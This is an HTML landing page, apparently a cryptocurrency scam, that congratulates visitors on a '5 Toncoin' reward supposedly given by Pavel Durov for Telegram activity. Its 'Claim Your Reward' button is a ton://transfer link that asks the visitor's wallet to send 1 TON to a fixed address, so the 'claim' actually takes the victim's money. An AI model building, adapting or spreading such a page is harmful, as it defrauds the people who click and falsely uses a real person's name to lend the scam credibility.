<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Toncoin Reward</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            animation: fadeIn 2s ease-out;
        }

        /* Animation for fading in */
        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        .container {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 480px;
            text-align: center;
            transform: scale(0.9);
            animation: scaleUp 0.5s ease-in-out forwards;
        }

        /* Animation for scaling up the container */
        @keyframes scaleUp {
            0% {
                transform: scale(0.9);
            }
            100% {
                transform: scale(1);
            }
        }

        h1 {
            font-size: 36px;
            margin-bottom: 20px;
            color: #ffd700;
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
        }

        p {
            font-size: 18px;
            margin-bottom: 30px;
            color: #f5f5f5;
            line-height: 1.6;
        }

        .btn {
            display: inline-block;
            padding: 18px 35px;
            font-size: 18px;
            font-weight: bold;
            background-color: #ff9800;
            color: black;
            text-decoration: none;
            border-radius: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s, background-color 0.3s, box-shadow 0.3s;
        }

        .btn:hover {
            background-color: #ff5722;
            transform: scale(1.1);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
        }

        .icon {
            font-size: 50px;
            margin-bottom: 20px;
            color: #ffd700;
            animation: bounce 1s infinite;
        }

        /* Animation for bouncing the icon */
        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-15px);
            }
        }

        .reward-text {
            font-size: 18px;
            margin-top: 20px;
            color: #e0e0e0;
            animation: fadeInText 1s ease-out;
        }

        /* Animation for fading in the reward text */
        @keyframes fadeInText {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        .footer {
            margin-top: 30px;
            font-size: 16px;
            color: #b0b0b0;
        }

        .footer a {
            color: #ffd700;
            text-decoration: none;
        }

        /* For mobile optimization */
        @media (max-width: 480px) {
            h1 {
                font-size: 28px;
            }

            p {
                font-size: 16px;
            }

            .btn {
                font-size: 16px;
                padding: 15px 30px;
            }

            .icon {
                font-size: 40px;
            }
        }

    </style>
</head>
<body>
    <div class="container">
        <div class="icon">??</div>
        <h1>?? Congratulations! ??</h1>
        <p>
            As a token of appreciation for your activity on Telegram, you have been rewarded with 
            <strong>5 Toncoin (5)</strong>! ??
        </p>
        <p class="reward-text">
            This reward is generously provided by <strong> Pavel Durov</strong> ??
        </p>
        <a href="ton://transfer/UQBGPcjpLyLOkCjdMt2mw-f1adTJZZTV4AOwM90edhSRjjN3?amount=1000000000" 
           class="btn">
            Claim Your Reward
        </a>
        <div class="footer">
            <p>Enjoy your reward and keep using Telegram! <br> ?? Stay connected with the world.</p>
        </div>
    </div>
</body>
</html>
